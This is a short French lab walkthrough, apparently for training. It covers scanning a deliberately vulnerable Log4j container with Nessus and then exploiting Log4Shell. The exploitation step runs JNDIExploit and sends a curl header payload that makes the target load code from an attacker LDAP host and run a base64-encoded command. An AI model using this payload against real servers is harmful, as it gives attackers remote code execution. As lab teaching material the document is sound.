# Prérequis
>Démarrer le container pour déployer l'application vulnérable
docker run --name vulnerable-app --rm --ulimit nofile=8096:8096 -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
>Démarrer le container Nessus
docker run -p 8834:8834 --name nessus tenableofficial/nessus

# Etape 1 - Identifier la vulnérabilité sur l'application
> Se rendre sur l'interface Nessus https://<ip_hote>:8834
> Se connecter avec les identifiants nessus:nessus
> Modifier le scan "Log4j" et définir l'adresse IP de la machine cible
> Lancer le scan
> Identifier la vulnérabilité Log4j au sein de l'application
> Identifier le point d'injection

# Etape 2 - Exploiter la vulnérabilité pour obtenir une RCE sur le serveur
>Executer l'exploit qui va démarrer un serveur ldap et servir le fichier .class malveillant
/usr/lib/jvm/java-11-openjdk-amd64/bin/java -jar ./JNDIExploit.v1.2/JNDIExploit-1.2-SNAPSHOT.jar -i 10.0.2.15 -p 8888
>Injectez dans l'application le payload qui contiendra une commande système encodée en base64
curl <ip_cible>:8080 -H '<header_http_vulnerable>: ${jndi:ldap://<ip_attaquant>:1389/Basic/Command/Base64/<commande_base64>}'

# Notes
Observez les logs de l'exploit, celui-ci va journaliser toutes les requêtes effectuées pour faciliter le debug
